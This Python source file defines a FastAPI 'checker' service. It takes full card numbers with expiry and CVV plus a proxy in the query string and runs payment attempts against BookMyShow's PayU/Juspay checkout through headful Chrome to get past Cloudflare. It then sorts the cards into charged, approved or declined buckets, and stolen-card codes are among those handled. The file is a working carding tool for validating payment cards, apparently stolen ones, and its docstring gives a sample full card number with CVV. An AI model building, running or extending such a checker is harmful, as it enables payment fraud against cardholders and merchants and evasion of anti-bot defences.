
"""
BMS (BookMyShow + PayU/Juspay) checker API — FastAPI endpoint for payu3.

Run on a no-display VPS under xvfb (headful Chrome is mandatory for Cloudflare):
    xvfb-run -a python3 payu3_api.py --port 9400

Usage:
    GET /bms?cc=5178058277710722|11|26|087&proxy=user:pass@host:port&key=ladle

Response (sanitized):
    {
      "cc": "5178058277710722|11|26|087",
      "response_code": "INSUFFICIENT_FUNDS",
      "response": "DECLINED",
      "real_response": "Insufficient funds",
      "amount": "180.00",
      "currency": "INR",
      "gateway": "BMS"
    }
"""
from __future__ import annotations

import asyncio
import os

from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse

from payu3 import run_bms_check, BmsResult

app = FastAPI(title="BMS Checker API (payu3)")

API_KEY = os.environ.get("BMS_API_KEY", "ladle")

# one headful browser at a time is heavy; cap concurrency per process
_BMS_SEM = asyncio.Semaphore(int(os.environ.get("BMS_MAX_CONCURRENCY", "2")))

# response_code -> bucket (CHARGED / APPROVED / DECLINED / ERROR)
_DECLINE_CODES = {
    "INSUFFICIENT_FUNDS", "DECLINED", "INCORRECT_CVV", "EXPIRED_CARD",
    "STOLEN_CARD", "INVALID_CARD", "NOT_ACCEPTED", "REFUSED_BY_ISSUER",
}
_APPROVE_CODES = {"3DS_REQUIRED", "CHALLENGE_REQUIRED", "APPROVED"}


def _sanitize(res: BmsResult) -> dict:
    code = res.response_code or "ERROR"
    if code == "CHARGED":
        bucket = "CHARGED"
    elif code in _APPROVE_CODES:
        bucket = "APPROVED"
    elif code in _DECLINE_CODES:
        bucket = "DECLINED"
    else:
        bucket = "ERROR"
    return {
        "cc": getattr(res, "cc", ""),
        "response_code": code,
        "response": bucket,
        "real_response": res.real_response or "N/A",
        "amount": res.amount or "0.00",
        "currency": "INR",
        "gateway": "BMS",
    }


@app.get("/bms")
async def bms(
    cc: str = Query(default=""),
    proxy: str = Query(default=""),
    key: str = Query(default=""),
):
    if key != API_KEY:
        return JSONResponse({"error": "invalid or missing API key"}, status_code=401)
    if not cc:
        return JSONResponse({"error": "missing cc"}, status_code=400)

    proxy_url = ""
    if proxy:
        p = proxy.strip()
        if "://" not in p:
            p = "http://" + p
        proxy_url = p

    async with _BMS_SEM:
        try:
            res = await run_bms_check(cc, proxy_url)
            out = _sanitize(res)
            out["cc"] = cc
            return JSONResponse(out)
        except Exception as e:
            msg = str(e) or ""
            low = msg.lower()
            import logging
            logging.getLogger("bms").error("check failed for %s: %s", cc[:6], msg[:200])
            if any(k in low for k in ("proxy", "curl", "timed out", "timeout", "connect", "resolve", "tunnel", "refused")):
                code = "PROXY_ERROR"
            elif "invalid card format" in low:
                code = "INVALID_CARD"
            elif "cloudflare" in low:
                code = "CLOUDFLARE_BLOCKED"
            else:
                code = "ERROR"
            return JSONResponse({
                "cc": cc,
                "response_code": code,
                "response": "ERROR",
                "real_response": "ERROR",
                "amount": "0.00",
                "currency": "INR",
                "gateway": "BMS",
            })


@app.get("/")
async def root():
    return {"ok": True, "api": "bms"}


if __name__ == "__main__":
    import uvicorn
    print("\n  BMS (payu3) FastAPI server: http://0.0.0.0:9400\n")
    uvicorn.run(app, host="0.0.0.0", port=9400, workers=1)
